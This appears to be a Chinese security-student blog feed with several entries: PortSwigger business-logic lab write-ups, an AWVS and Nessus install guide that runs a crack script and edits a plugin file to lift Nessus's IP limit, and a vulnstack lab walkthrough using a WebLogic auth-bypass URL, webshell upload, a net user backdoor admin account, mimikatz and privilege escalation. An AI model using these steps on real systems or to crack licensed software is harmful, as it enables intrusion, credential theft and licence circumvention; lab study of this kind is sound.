alt="image-20240912223849245"></p><p>漏洞原理<br>使⽤指定的 @dontwannacry.com进⾏注册，漏洞在于邮箱会被截短为255字符，所以使⽤@dontwannacry.com作为⼦域名（且保证后⾯的字符串被截断）  </p><p><img src="/../image/image-20240912224140236-1726237660677-35.png" alt="image-20240912224140236"></p><p><img src="/../image/image-20240912224340463-1726237660677-36.png" alt="image-20240912224340463"></p><p><img src="/../image/image-20240912224358892-1726237660677-37.png" alt="image-20240912224358892"></p><p><img src="/../image/image-20240912224653066-1726237660677-38.png" alt="image-20240912224653066"></p><p><img src="/../image/image-20240912224710852-1726237660677-39.png" alt="image-20240912224710852"></p><h2 id="Weak-isolation-on-dual-use-endpoint：双⽤端点上的弱隔离"><a href="#Weak-isolation-on-dual-use-endpoint：双⽤端点上的弱隔离" class="headerlink" title="Weak isolation on dual-use endpoint：双⽤端点上的弱隔离"></a>Weak isolation on dual-use endpoint：双⽤端点上的弱隔离</h2><p>This lab makes a flawed assumption about the user’s privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users’ accounts. To solve the lab, access the <code>administrator</code> account and delete the user <code>carlos</code>.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><p>在 Burp 运行时，登录并访问您的帐户页面。<br>更改您的密码。<br>研究 Burp Repeater 中的 POST &#x2F;my-account&#x2F;change-password 请求。<br>请注意，如果您完全删除 current-password 参数，则可以成功更改密码而无需提供当前密码。<br>请注意，更改密码的用户由 username 参数决定。设置 username&#x3D;administrator 并再次发送请求。<br>注销并注意，您现在可以使用刚刚设置的密码成功以管理员身份登录。<br>转到管理面板并删除 carlos 以解决实验。</p><p>登陆测试账号后，抓取修改密码的数据包 </p><p><img src="/../image/image-20240912232932669-1726237660677-40.png" alt="image-20240912232932669"></p><p><img src="/../image/image-20240912232922314-1726237660677-41.png" alt="image-20240912232922314"></p><p>发现删除：current-password参数(⽤户原密码)，任然能修改成功  </p><p><img src="/../image/image-20240912232958128-1726237660677-42.png" alt="image-20240912232958128"></p><p>将⽤户名换成administrator，修改管理员的密码，登陆成功  </p><p><img src="/../image/image-20240912233043926-1726237660677-43.png" alt="image-20240912233043926"></p><p>删除carlos⽤户，完成实验  </p><p><img src="/../image/image-20240912233125866-1726237660677-44.png" alt="image-20240912233125866"></p><h2 id="Insufficient-workflow-validation"><a href="#Insufficient-workflow-validation" class="headerlink" title="Insufficient workflow validation"></a>Insufficient workflow validation</h2><p>此实验对购买工作流程中的事件顺序做出了错误的假设。要解决此实验，请利用此缺陷购买“轻便 l33t 皮夹克”。</p><p>您可以使用以下凭据登录自己的帐户：wiener:peter</p><p>在 Burp 运行的情况下，登录并使用您的商店信用购买您能负担得起的任何商品。<br>研究代理历史记录。观察您下订单时，POST &#x2F;cart&#x2F;checkout 请求会将您重定向到订单确认页面。将 GET &#x2F;cart&#x2F;order-confirmation?order-confirmation&#x3D;true 发送到 Burp Repeater。<br>将皮夹克添加到您的购物篮。<br>在 Burp Repeater 中，重新发送订单确认请求。观察订单已完成，费用未从您的商店信用中扣除，并且实验室已解决。</p><p>购买成功的流程</p><p>选择低价商品，添加到购物⻋，购买，观察数据包  </p><p><img src="/../image/image-20240913155136972-1726237660677-45.png" alt="image-20240913155136972"></p><p><img src="/../image/image-20240913155305467-1726237660677-46.png" alt="image-20240913155305467"></p><p>再看看失败的流程</p><p><img src="/../image/image-20240913155427570-1726237660677-47.png" alt="image-20240913155427570"></p><p>对⽐两个流程，发现购买成功和失败会跳转到不同⻚⾯</p><p>添加⽪夹克商品到购物⻋，访问购买成功的url，发现能直接清空购物⻋  </p><p><img src="/../image/image-20240913155651472-1726237660677-48.png" alt="image-20240913155651472"></p><p><img src="/../image/image-20240913155701807-1726237660677-49.png" alt="image-20240913155701807"></p><h2 id="Authentication-bypass-via-flawed-state-machine"><a href="#Authentication-bypass-via-flawed-state-machine" class="headerlink" title="Authentication bypass via flawed state machine"></a>Authentication bypass via flawed state machine</h2><p>This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab’s authentication, access the admin interface, and delete the user <code>carlos</code>.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><p>在 Burp 运行时，完成登录过程，并注意您需要在进入主页之前选择您的角色。<br>使用内容发现工具识别 &#x2F;admin 路径。<br>尝试直接从角色选择页面浏览到 &#x2F;admin，并观察这是否不起作用。<br>注销然后返回登录页面。在 Burp 中，打开代理拦截，然后登录。<br>转发 POST &#x2F;login 请求。下一个请求是 GET &#x2F;role-selector。删除此请求，然后浏览到实验室的主页。观察您的角色已默认为管理员角色，并且您可以访问管理面板。<br>删除 carlos 以解决实验室问题。</p><p>登陆测试账号，发现登陆后需要选择⻆⾊  </p><p><img src="/../image/image-20240913160403108-1726237660677-50.png" alt="image-20240913160403108"></p><p>重新登陆，⽤burp抓包，然后drop掉，跳转到选择⻆⾊的数据包  </p><p><img src="/../image/image-20240913160707116-1726237660677-51.png" alt="image-20240913160707116"></p><p>丢掉指点数据包后，刷新⻚⾯，访问&#x2F;admin目录发现直接就是管理员权限  </p><p><img src="/../image/image-20240913161252757-1726237660677-52.png" alt="image-20240913161252757"></p><p><img src="/../image/image-20240913161319534.png" alt="image-20240913161319534"></p><h2 id="Infinite-money-logic-flawI"><a href="#Infinite-money-logic-flawI" class="headerlink" title="Infinite money logic flawI"></a>Infinite money logic flawI</h2><p>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p><p>此解决方案使用 Burp Intruder 来自动化购买和兑换礼品卡的过程。精通 Python 的用户可能更喜欢使用 Turbo Intruder 扩展。</p><p>在 Burp 运行时，登录在home页面底部并注册新闻通讯以获取优惠券代码 SIGNUP30。请注意，您可以购买 10 美元的礼品卡并从“我的帐户”页面兑换它们。</p><p><img src="/../image/image-20240917164606686.png" alt="image-20240917164606686"></p><p>将礼品卡添加到您的购物篮并继续结帐。应用优惠券代码可获得 30% 的折扣。完成订单并将礼品卡代码复制到剪贴板。</p><p><img src="/../image/image-20240917164735575.png" alt="image-20240917164735575"></p><p>转到您的帐户页面并兑换礼品卡。观察到整个过程为您的商店信用增加了 3 美元。现在您需要尝试自动化此过程。</p><p><img src="/../image/image-20240917164831826.png" alt="image-20240917164831826"></p><p><img src="/../image/image-20240917164927263.png" alt="image-20240917164927263"></p><p><img src="/../image/image-20240917164934084.png" alt="image-20240917164934084"></p><p>如果优惠券可以重复使用，就可以利用该操作达到无限金额的效果，成功复用优惠券</p><p>重新添加商品，发现优惠卷可以无限使用</p><p><img src="/../image/image-20240917171350575.png" alt="image-20240917171350575"></p><p>在Burp工具中配置自动化，来无限增加余额</p><p><img src="/../image/image-20240917171820809.png" alt="image-20240917171820809"></p><p><img src="/../image/image-20240917171933915.png" alt="image-20240917171933915"></p><p>添加这五个关键数据包</p><p><img src="/../image/image-20240917172358064.png" alt="image-20240917172358064"></p><p><img src="/../image/image-20240917172455587.png" alt="image-20240917172455587"></p><p><img src="/../image/image-20240917172529165.png" alt="image-20240917172529165"></p><p><img src="/../image/image-20240917172914792.png" alt="image-20240917172914792"></p><p>第五个数据包:gift-card参数选择为第四个响应包中的内容</p><p><img src="/../image/image-20240917173042503.png" alt="image-20240917173042503"></p><p>发包测试:金额增加3元</p><p><img src="/../image/image-20240917173239532.png" alt="image-20240917173239532"></p><p>burp重新抓包:&#x2F;my-account，发送到intruder，</p><p><img src="/../image/image-20240917193608193.png" alt="image-20240917193608193"></p><p><img src="/../image/image-20240917193538690.png" alt="image-20240917193538690"></p><p>这里后面不懂怎么code没有了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>awvs+Nessus安装与卸载</title>
      <link href="/2024/09/13/awvs-Nessus%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD/"/>
      <url>/2024/09/13/awvs-Nessus%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="AWVS-Nessus安装与卸载"><a href="#AWVS-Nessus安装与卸载" class="headerlink" title="AWVS+Nessus安装与卸载"></a>AWVS+Nessus安装与卸载</h1><h2 id="AWVS卸载"><a href="#AWVS卸载" class="headerlink" title="AWVS卸载"></a>AWVS卸载</h2><p>因为之前安装过了，这里正好重新卸载了再装</p><p>第一步：先查看awvs的服务状态,开启的话给它停了</p><p><img src="/../image/image-20240913201650906-1726237650895-1.png" alt="image-20240913201650906"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status acunetix.service</span><br><span class="line">systemctl stop acunetix.service</span><br></pre></td></tr></table></figure><p>第二步：删除软件安装目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*acunetix*&quot; # 可以先看看有哪些相关文件</span><br><span class="line">rm -rf /home/acunetix/</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913202113988-1726237650896-2.png" alt="image-20240913202113988"></p><p>卸载的时候可能会发现有些文件卸载不了，这应该是破解用的文件，限制了权限，<a href="https://blog.csdn.net/SweeNeil/article/details/103237214">解决方案</a></p><p><strong>lsattr</strong>可用来查看文件的属性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsattr filename</span><br></pre></td></tr></table></figure><p> 如果文件属性中有i与a，或者有其中的一个</p><p>可以使用<strong>chattr</strong>去掉这属性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr -ia filename</span><br></pre></td></tr></table></figure><p>此时再次使用chmod命令即可更改文件的权限。</p><p><img src="/../image/image-20240913202446952-1726237650896-3.png" alt="image-20240913202446952"></p><p>第三步，删除awvs建立的用户。在&#x2F;etc&#x2F;passwd 里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;$1==&quot;acunetix&quot; &#123;print&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913202835095-1726237650896-5.png" alt="image-20240913202835095">s</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userdel acunetix</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913202850916-1726237650896-4.png" alt="image-20240913202850916"></p><p>不管怎么样，重启一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h2 id="AWVS安装"><a href="#AWVS安装" class="headerlink" title="AWVS安装"></a>AWVS安装</h2><p>准备安装用的压缩包：<a href="https://get-shell.com/853.html">https://get-shell.com/853.html</a></p><p><img src="/../image/image-20240913203216048-1726237650896-6.png" alt="image-20240913203216048"></p><p>解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip -d Acunetix-v24.8.24-Linux Acunetix-v24.8.24-Linux.zip </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913204108702-1726237650896-7.png" alt="image-20240913204108702"></p><p>执行acunetix_install.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash acunetix_install.sh</span><br></pre></td></tr></table></figure><p>要注意慢一点回车，yes</p><p><img src="/../image/image-20240913204159484-1726237650896-8.png" alt="image-20240913204159484"></p><p><img src="/../image/image-20240913204202413-1726237650896-9.png" alt="image-20240913204202413"></p><p>破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash crack.sh</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913204214741-1726237650896-10.png" alt="image-20240913204214741"></p><p>访问地址<a href="https://localhost:3443/">https://localhost:3443/</a></p><p><img src="/../image/image-20240913204626831-1726237650896-11.png" alt="image-20240913204626831"></p><p><img src="/../image/image-20240913204622434-1726237650896-12.png" alt="image-20240913204622434"></p><p>可以扫描以下awvs的测试站点试试<a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a></p><p><img src="/../image/image-20240913204730289-1726237650896-13.png" alt="image-20240913204730289"></p><p><img src="/../image/image-20240913204945450-1726237650896-14.png" alt="image-20240913204945450"></p><h2 id="Nessus安装"><a href="#Nessus安装" class="headerlink" title="Nessus安装"></a>Nessus安装</h2><p>安装包地址：<a href="https://get-shell.com/1865.html#hidden-box-comment">https://get-shell.com/1865.html#hidden-box-comment</a></p><p>解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip -d Nessus-v10.7.4-Linux-Offline Nessus-v10.7.4-Linux-Offline.zip</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913210352449-1726237650896-15.png" alt="image-20240913210352449"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg -i Nessus-latest-debian10_amd64.deb </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913211016579-1726237650896-16.png" alt="image-20240913211016579"></p><h3 id="启动Nessus"><a href="#启动Nessus" class="headerlink" title="启动Nessus"></a>启动Nessus</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">service nessusd <span class="keyword">start</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913211107742-1726237650896-17.png" alt="image-20240913211107742"></p><p>浏览器访问nessus的web网站</p><p><a href="https://localhost:8834/#/,%E5%8B%BE%E9%80%89offline">https://localhost:8834/#/,勾选offline</a></p><p><img src="/../image/image-20240913211227883-1726237650896-18.png" alt="image-20240913211227883"></p><p>选择 【Managed Scanner】选项，点击【Continue】</p><p><img src="/../image/image-20240913211333583-1726237650896-19.png" alt="image-20240913211333583"></p><p>选择【Tenable Security Center】</p><p><img src="/../image/image-20240913211455737-1726237650896-20.png" alt="image-20240913211455737"></p><p>输入用户名【admin】，输入密码【123456】，点击【Submit】</p><p><img src="/../image/image-20240913211547476-1726237650896-23.png" alt="image-20240913211547476"></p><p>.等待配置插件(可以先去申请下激活码)</p><p><img src="/../image/image-20240913211607584-1726237650896-21.png" alt="image-20240913211607584"></p><p>显示这个说明安装完成</p><p><img src="/../image/image-20240913212156162-1726237650896-22.png" alt="image-20240913212156162"></p><h3 id="申请激活码"><a href="#申请激活码" class="headerlink" title="申请激活码"></a>申请激活码</h3><p>去nessus官方申请激活码，姓名随便填，邮箱必须正确，用来接收激活码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://zh-cn.tenable.com/products/nessus/nessus-essentials</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913211858839-1726237650896-24.png" alt="image-20240913211858839"></p><p><img src="/../image/image-20240913211919895-1726237650897-27.png" alt="image-20240913211919895"></p><p>去邮箱查看下激活码</p><p><img src="/../image/image-20240913212036136-1726237650896-25.png" alt="image-20240913212036136"></p><p>获得质询码（challenge code）</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch  --challenge</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913212230176-1726237650896-26.png" alt="image-20240913212230176"></p><p>.获取离线插件包地址及激活证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://plugins.nessus.org/v2/offline.php</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913212407660-1726237650897-28.png" alt="image-20240913212407660"></p><p><img src="/../image/image-20240913212621767-1726237650897-29.png" alt="image-20240913212621767"></p><p>滑倒底下</p><p><img src="/../image/image-20240913212707261-1726237650897-30.png" alt="image-20240913212707261"></p><p>下载更新包，下载证书nessus.license</p><p><img src="/../image/image-20240913212753122-1726237650897-31.png" alt="image-20240913212753122"></p><p>.将下载好的激活证书和插件包复制到kali</p><p><img src="/../image/image-20240913213601467-1726237650897-32.png" alt="image-20240913213601467"></p><h3 id="离线激活nessus"><a href="#离线激活nessus" class="headerlink" title="离线激活nessus"></a>离线激活nessus</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch --register-offline ./nessus.license</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913222425286-1726237650897-33.png" alt="image-20240913222425286"></p><p> 安装插件包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913214451648-1726237650897-34.png" alt="image-20240913214451648"></p><h3 id="重启nessus"><a href="#重启nessus" class="headerlink" title="重启nessus"></a>重启nessus</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemclt restart nessus</span><br></pre></td></tr></table></figure><p>访问</p><p><img src="/../image/image-20240913214613725-1726237650897-35.png" alt="image-20240913214613725"></p><p>完成后进入nessus系统。显示激活成功，具有了scan功能。但显示仅允许扫描16个IP。</p><p>(三）解除IP限制<br>1.获取当前plugins的版本<br><a href="https://plugins.nessus.org/v2/plugins.php">https://plugins.nessus.org/v2/plugins.php</a></p><p><img src="/../image/image-20240913215601950-1726237650897-36.png" alt="image-20240913215601950">2.停止nessus服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nessusd stop</span><br></pre></td></tr></table></figure><p>3.创建 plugin_feed_info.inc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>内容如下，并将刚刚获取到的版本号替换如下内容中的数字串。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLUGIN_SET = &quot;202409131017&quot;;</span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;</span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913220311863-1726237650897-37.png" alt="image-20240913220311863"></p><p>4.将plugin_feed_info.inc替换到 &#x2F;opt&#x2F;nessus&#x2F;var&#x2F;nessus&#x2F;plugin_feed_info.inc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp plugin_feed_info.inc /opt/nessus/var/nessus/</span><br></pre></td></tr></table></figure><p>5.将 &#x2F;opt&#x2F;nessus&#x2F;lib&#x2F;nessus&#x2F;plugins&#x2F;plugin_feed_info.inc 文件删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>6.启动nessus服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nessusd start</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240913220421815-1726237650897-38.png" alt="image-20240913220421815"></p><p>7.访问Nessus<br>    windows打开浏览器，访问nessus，会看到nessus初始化插件，完成后，看设置页面显示 unlimited。表示解除IP限制成功。</p><p>因为nussus服务开启的状态很占用系统资源，所以没用的时候最好关闭</p><ul><li>关闭Nessus开机自动启动</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable nessusd </span><br></pre></td></tr></table></figure><ul><li>停止Nessus服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop nessusd </span><br></pre></td></tr></table></figure><ul><li>开启Nessus服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nessusd </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack-day2</title>
      <link href="/2024/09/09/vulnstack-day2/"/>
      <url>/2024/09/09/vulnstack-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>靶机通用密码： 1qaz@WSX</p><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/../image/image-20240909103806499.png" alt="image-20240909103806499"></p><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>内网网段：10.10.10.1&#x2F;24</p><p><img src="/../image/image-20240909112914979.png" alt="image-20240909112914979"></p><p>DMZ网段：192.168.111.1&#x2F;24</p><p><img src="/../image/image-20240909150417410.png" alt="image-20240909150417410"> </p><p>DC（仅允许内网用户访问，不出网）：</p><p>IP：10.10.10.10</p><p>OS：Windows 2012(64)</p><p>应用：AD域</p><p><img src="/../image/image-20240909113154824.png" alt="image-20240909113154824"></p><p><img src="/../image/image-20240909113230453.png" alt="image-20240909113230453"></p><p>WEB（初始的状态默认密码无法登录，切换用户 de1ay&#x2F;1qaz@WSX 登录进去）：</p><p>IP1：10.10.10.80(和域内主机连通)</p><p>IP2：192.168.111.80(允许外网访问，网站部署在该ip)</p><p>OS：Windows 2008</p><p>应用：Weblogic 10.3.6 MSSQL 2008</p><p>修改配置需要登陆验证Administrator&#x2F;1qaz@WSX</p><p><img src="/../image/image-20240909151304508.png" alt="image-20240909151304508"></p><p><img src="/../image/image-20240909152657966.png" alt="image-20240909152657966"></p><p>开启weblogic：C:\Oracle\Middleware\user_projects\domains\base_domain</p><p><img src="/../image/image-20240909161047420.png" alt="image-20240909161047420"></p><p><img src="/../image/image-20240909161151196.png" alt="image-20240909161151196"></p><p>内网网卡是禁止访问的</p><p>PC</p><p>IP1：10.10.10.111</p><p>IP2：192.168.111.201</p><p>OS：Windows 7，域内主机</p><p><img src="/../image/image-20240909153027768.png" alt="image-20240909153027768"></p><p><strong>攻击机：</strong></p><p>IP：192.168.111.130</p><p>OS：Kali</p><p><img src="/../image/image-20240909161431649.png" alt="image-20240909161431649"></p><p>OS：Windows 10</p><p>IP：192.168.111.129</p><p><img src="/../image/image-20240909165322026.png" alt="image-20240909165322026"></p><h1 id="二、外网渗透"><a href="#二、外网渗透" class="headerlink" title="二、外网渗透"></a>二、外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到环境后，首先进行端口探测，这里使用**-sS<strong>参数，</strong>由于防火墙的存在不能使用icmp包，所以使用syn包探测**</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -v 192.168.111.80</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909164923586.png" alt="image-20240909164923586"></p><p>可以看到开放的端口还是挺多的，我们通过端口初步判断目标机存在的服务及可能存在的漏洞，如445端口开放就意味着存smb服务，存在smb服务就可能存在ms17-010&#x2F;端口溢出漏洞。开放139端口，就存在Samba服务，就可能存在爆破&#x2F;未授权访问&#x2F;远程命令执行漏洞。开放1433端口，就存在mssql服务，可能存在爆破&#x2F;注入&#x2F;SA弱口令。开放3389端口，就存在远程桌面。开放7001端口就存在weblogic。</p><p>我们可以再用漏扫如fscan扫一下，能更快的确定漏洞位置，以及要利用的漏洞</p><p><img src="/../image/image-20240909204906345.png" alt="image-20240909204906345"></p><p>用fscan扫描可以发现是可能存在相关的漏洞的，</p><p>但我们在利用时可能有些漏洞是用不了的，猜测可能是因为防火墙或360等限制，但fscan还是 有扫出CVE-2020-14750，这个是一个未授权访问的楼洞，我们可以绕过登陆试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.80:7001/console/images/%252E./console.portal</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909210034402.png" alt="image-20240909210034402"></p><p>但是无法进行上传文件，我们可以试试cve-2019-2725，这个是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><p>可以访问&#x2F;_async&#x2F;AsyncResponseService，则存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.80:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909210316411.png" alt="image-20240909210316411"></p><p>查看网站路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.80:7001/_async/AsyncResponseService?info</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909210417020.png" alt="image-20240909210417020"></p><p>在本机中开启简易http服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909210634155.png" alt="image-20240909210634155"></p><p>使用burp suite进行抓包，发送数据包，使服务下载木马文件,但没有下载工具所以不好上传，这两个洞都不是很好利用</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>用weblogicscan扫一下，也可以直接用综合利用工具</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><p><img src="/../image/image-20240909212324407.png" alt="image-20240909212324407"></p><p>还是综合利用工具方便</p><h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><p>因为我们开始是ping不通web主机的，可能被防火墙限制了，也可能存在杀毒软件，我们可以用命令执行看看当前进程，是否存在相关程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240909212922869.png" alt="image-20240909212922869"></p><p>存在360，应该先做免杀的，但这里不会，就先不做了，然后这个工具没有写某些漏洞的上传，这里换个工具用</p><p><img src="/../image/image-20240909223507458.png" alt="image-20240909223507458"></p><p>上传shell</p><p><img src="/../image/image-20240909230458466.png" alt="image-20240909230458466"></p><p><img src="/../image/image-20240909230429649.png" alt="image-20240909230429649"></p><p>访问成功，尝试连接，这里换了个马，前面连接失败，估计是中文的问题，删除木马里的中文即可</p><p><img src="/../image/image-20240909230954552.png" alt="image-20240909230954552"></p><p>寻找一下位置</p><p><img src="/../image/image-20240909231157137.png" alt="image-20240909231157137"></p><p>注入内存马稳定shell：</p><p><img src="/../image/image-20240909231243886.png" alt="image-20240909231243886"></p><h2 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集(1)"></a>内网信息收集(1)</h2><p>存在多张网卡</p><p><img src="/../image/image-20240910100125127.png" alt="image-20240910100125127"></p><p>看看是否在域环境中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240910102809286.png" alt="image-20240910102809286"></p><p>拒绝访问，看下变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo %userdomain%</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240910102831018.png" alt="image-20240910102831018"></p><h2 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h2><p>一、 3389上去直接关闭，需要创建管理员用户<br>二、 提权到system关闭<br>三、 对c2做免杀</p><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user eraser 1qaz@WSX /add</span><br><span class="line">net localgroup Administrators eraser /add</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240910103144628.png" alt="image-20240910103144628"></p><p>远程登陆，administrators域是登不进去的，只能登入到web域</p><p><img src="/../image/image-20240910103515498.png" alt="image-20240910103515498"></p><p><img src="/../image/image-20240910104607823.png" alt="image-20240910104607823"></p><p>关闭防火墙</p><p><img src="/../image/image-20240910104827574.png" alt="image-20240910104827574"></p><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p><img src="/../image/image-20240910160550415.png" alt="image-20240910160550415"></p><p>抓取明文密码</p><p><img src="/../image/image-20240910161054947.png" alt="image-20240910161054947"></p><p>可以直接dump hashes</p><p><img src="/../image/image-20240910161109746.png" alt="image-20240910161109746"></p><p>mimikatz</p><p><img src="/../image/image-20240910161206539.png" alt="image-20240910161206539"></p><p>点击credentails</p><p><img src="/../image/image-20240910161823599.png" alt="image-20240910161823599"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>ms14-058 提到 system 权限</p><p>我说怎么半天没回显</p><p><img src="/../image/image-20240910230839759.png" alt="image-20240910230839759"></p><p>蓝屏了。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnstack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初学kerberos</title>
      <link href="/2024/09/08/%E5%88%9D%E5%AD%A6kerberos/"/>
      <url>/2024/09/08/%E5%88%9D%E5%AD%A6kerberos/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/swordfall/p/12009716.html">https://www.cnblogs.com/swordfall/p/12009716.html</a></p><p><a href="https://cloud.tencent.com/developer/article/2227940">https://cloud.tencent.com/developer/article/2227940</a></p><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机&#x2F;服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的</p><p>kerberos协议中也存在三个角色，分别是<br>    客户端A(client):发送请求的一方<br>    服务端B(Server):接收请求的一方<br>    密钥分发中心C(Key Distribution Center,而密钥分发中心一般又分为两部分，分别是:<br>        AS(Authentication Server)认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT(票据授予票据)<br>    TGS (Ticket Granting Ticket)票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据(Ticket)</p><p><img src="/../image/image-20240908154641008.png" alt="image-20240908154641008"></p><p><img src="/../image/image-20240908163018011.png" 